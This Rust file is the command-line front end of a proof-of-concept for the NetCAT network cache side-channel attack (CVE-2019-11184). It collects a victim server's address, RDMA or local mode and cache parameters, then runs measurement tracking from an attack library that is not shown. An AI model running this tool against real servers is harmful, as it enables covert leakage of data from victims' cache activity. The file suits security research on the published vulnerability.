use clap::{crate_authors, crate_version, App, Arg};
use std::net::IpAddr;
use std::str::FromStr;

const DEFAULT_PORT: &str = "9003";
const DEFAULT_MEASUREMENT_CNT: &str = "10000";
const DEFAULT_CACHE: &str = "E5_DDIO";

static CONN_TYPES: &[&str] = &["rdma", "local"];
static CACHES: &[&str] = &["E5_DDIO", "E5", "I7", "custom"];

fn main() {
    let matches = app_cli_config().get_matches();

    if matches.is_present("interactive")
    {
        interactive::run_session();
    } else {
        uninteractive::run_session(matches);
    }
}

fn app_cli_config<'a, 'b>() -> App<'a, 'b> {
    App::new("NetCAT PoC")
        .version(crate_version!())
        .author(crate_authors!())
        .about("Implementation of the Network Cache Attack (CVE-2019-11184)")
        .arg_from_usage("[interactive] -i --interactive 'Sets the program into interactive mode. Ignores all other arguments'")
        .arg(
            Arg::with_name("connection")
                .long("conn")
                .short("c")
                .default_value("rdma")
                .value_name("CONNECTION_TYPE")
                .possible_values(CONN_TYPES)
                .help("Sets the connection type"),
        )
        .arg(
            Arg::with_name("address")
                .help("Victim server adress")
                .long("addr")
                .short("a")
                .takes_value(true)
                .value_name("IP_ADDR")
                .required_if("connection", "rdma")
                .default_value_if("interactive", None, "127.0.0.1")
                .validator(|x| match IpAddr::from_str(x.as_str()) {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("Faulty IP adress")),
                }),
        )
        .arg(
            Arg::with_name("port")
                .help("Victim server port to be used for control packets")
                .long("port")
                .short("p")
                .takes_value(true)
                .required_if("conneciton", "rdma")
                .value_name("PORT")
                .default_value(DEFAULT_PORT)
                .validator(|x| match x.parse::<u16>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("Faulty port")),
                }),
        )
        .arg(
            Arg::with_name("measurements")
                .help("The number of measurements to be taken")
                .long("measurements")
                .short("m")
                .takes_value(true)
                .default_value(DEFAULT_MEASUREMENT_CNT)
                .value_name("MESUREMENTS")
                .validator(|num_str| match num_str.parse::<usize>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("MEAUSEMENTS should be a number")),
                }),
        )
        .arg(
            Arg::with_name("cache_description")
                .help("Parameters, describing last level cache of the victim's machine")
                .long("cache_params")
                .short("d")
                .value_name("CACHE")
                .default_value(DEFAULT_CACHE)
                .possible_values(CACHES)
        )
        .arg(
            Arg::with_name("custom_cache")
                .help("Gives concrete parameters of the victim's LLC, if the predifined are not enough")
                .long("custom_params")
                .value_names(&["BYTES_PER_LINE", "ASSOCIATIVITY", "CACHE_SIZE_BYTES"])
                .required_if("cache_description", "custom")
                .validator(|s| match s.parse::<usize>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err("Invalind cache parameters: should be numbers".to_string())
                })
        )
        .arg_from_usage("[quite] -q --quite 'Does not disturb anyone by the output'")
        .arg_from_usage("[output] 'Output file to dump data to'")
}

mod uninteractive {
    use clap::{value_t, ArgMatches};
    use console::style;
    use get_if_addrs::get_if_addrs;
    use netcat::connection::CacheConnector;
    use netcat::connection::{local::LocalMemoryConnector, rdma::RdmaServerConnector};
    use netcat::online_tracker;
    use netcat::rpp::params::CacheParams;
    use netcat::rpp::params::*;
    use netcat::rpp::Contents;
    use std::net::ToSocketAddrs;
    use std::process::exit;

    pub fn run_session(args: ArgMatches) {
        let quite = args.is_present("quite");
        let port = value_t!(args.value_of("port"), u16).unwrap();
        let cnt = value_t!(args.value_of("measurements"), usize).unwrap();

        let cache_type = args.value_of("cache_description").unwrap();

        let cparams = match cache_type {
            "E5" => XEON_E5,
            "E5_DDIO" => XEON_E5_DDIO,
            "I7" => CORE_I7,
            "custom" => {
                let mut vals = args.values_of("custom_cache").unwrap();
                let bytes_per_line = vals.next().unwrap().parse().unwrap();
                let lines_per_set = vals.next().unwrap().parse().unwrap();
                let cache_size = vals.next().unwrap().parse().unwrap();
                CacheParams::new(bytes_per_line, lines_per_set, cache_size)
            }
            _ => panic!("Unsupported value"),
        };

        // Unwraping is ok as we have a default value
        if args.value_of("connection").unwrap() == "rdma" {
            // these are required for rdma and validated
            let ip = args.value_of("address").unwrap();
            let conn = match RdmaServerConnector::new((ip, port)) {
                Ok(c) => c,
                Err(e) => {
                    if !quite {
                        panic!("{}", style(e).red())
                    } else {
                        exit(1)
                    }
                }
            };

            do_measurements((ip, port), conn, cnt, quite, cparams);
        } else {
            // this is a local scenario
            // but we still need an address for synchronization
            let ip = get_if_addrs()
                .expect("ERROR: Could not get machine network interfaces")
                .into_iter()
                .filter(|i| !i.is_loopback())
                .next()
                .expect("ERROR: no network interface found")
                .ip();
            let conn = LocalMemoryConnector::new();

            do_measurements((ip, port), conn, cnt, quite, cparams);
        }
    }

    fn do_measurements<A, C>(addr: A, conn: C, cnt: usize, quite: bool, cparams: CacheParams)
    where
        A: ToSocketAddrs,
        C: CacheConnector<Item = Contents>,
    {
        let mut tracker =
            online_tracker::OnlineTracker::for_cache(addr, conn, quite, cparams).unwrap();

        if let Err(e) = tracker.track(cnt) {
            if !quite {
                println!("Online Tracker: {}", style(e).red());
            }
        }
        if !quite {
            println!(
                "Online Tracker: {}",
                style("MEASUREMENTS COMPLETED").green()
            );
        }
    }
}

mod interactive {
    use console::style;
    use dialoguer::{theme::ColorfulTheme, Confirmation, Input, Select};
    use get_if_addrs::get_if_addrs;
    use netcat::connection::{
        local::LocalMemoryConnector, rdma::RdmaServerConnector, CacheConnector,
    };
    use netcat::online_tracker::OnlineTracker;
    use netcat::rpp::{params::*, Contents};
    use std::net::{IpAddr, SocketAddr, ToSocketAddrs};
    use std::str::FromStr;

    pub fn run_session() {
        let conn_selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Choose connection type")
            .default(0)
            .items(super::CONN_TYPES)
            .interact()
            .unwrap();

        let sock_addr = if super::CONN_TYPES[conn_selection] == "rdma" {
            get_remote_addr()
        } else {
            get_local_addr()
        };

        let cache_type = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Choose cache")
            .default(0)
            .items(super::CACHES)
            .interact()
            .unwrap();

        let cparams = match super::CACHES[cache_type] {
            "E5_DDIO" => XEON_E5_DDIO,
            "E5" => XEON_E5,
            "I7" => CORE_I7,
            "custom" => get_custom_cache(),
            _ => panic!("Unsupported cache"),
        };

        if super::CONN_TYPES[conn_selection] == "rdma" {
            let conn = match RdmaServerConnector::new(sock_addr) {
                Ok(c) => c,
                Err(e) => panic!("{}", style(e).red()),
            };
            do_measurements(sock_addr, conn, cparams);
        } else {
            let conn = LocalMemoryConnector::new();
            do_measurements(sock_addr, conn, cparams);
        }
    }
    fn get_ip() -> IpAddr {
        Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Enter IP of the server")
            .validate_with(|x: &str| match IpAddr::from_str(x) {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Faulty IP adress")),
            })
            .interact()
            .unwrap()
    }

    fn get_port() -> u16 {
        Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Enter port to send to")
            .default(super::DEFAULT_PORT.parse().unwrap())
            .show_default(true)
            .validate_with(|x: &str| match x.parse::<u16>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Faulty port")),
            })
            .interact()
            .unwrap()
    }

    fn get_remote_addr() -> SocketAddr {
        (get_ip(), get_port()).into()
    }

    fn get_local_addr() -> SocketAddr {
        let ip = get_if_addrs()
            .expect("ERROR: Could not get machine network interfaces")
            .into_iter()
            .filter(|i| !i.is_loopback())
            .next()
            .expect("ERROR: no network interface found")
            .ip();
        (ip, get_port()).into()
    }

    fn get_custom_cache() -> CacheParams {
        let bytes_per_line: usize = Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Enter number of bytes per cache line")
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Must be a number")),
            })
            .interact()
            .unwrap();

        let lines_per_set: usize = Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Associativity of the cache")
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Must be a number")),
            })
            .interact()
            .unwrap();

        let cache_size: usize = Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Size of the cache in bytes")
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Must be a number")),
            })
            .interact()
            .unwrap();

        CacheParams::new(bytes_per_line, lines_per_set, cache_size)
    }

    fn do_measurements<A, C>(addr: A, conn: C, cparams: CacheParams)
    where
        A: ToSocketAddrs,
        C: CacheConnector<Item = Contents>,
    {
        let mut tracker = OnlineTracker::for_cache(addr, conn, false, cparams).unwrap();
        let mut not_done = true;

        while not_done {
            let cnt = get_cnt();
            if let Err(e) = tracker.track(cnt) {
                println!("Online Tracker: {}", style(e).red());
            }
            println!(
                "Online Tracker: {}",
                style("MEASUREMENTS COMPLETED").green()
            );

            not_done = should_continue();
        }
    }

    fn get_cnt() -> usize {
        Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Enter number of measurements")
            .default(super::DEFAULT_MEASUREMENT_CNT.parse().unwrap())
            .show_default(true)
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Faulty port")),
            })
            .interact()
            .unwrap()
    }

    fn should_continue() -> bool {
        Confirmation::new()
            .with_text("Do you want to continue?")
            .default(true)
            .show_default(true)
            .interact()
            .unwrap()
    }
}
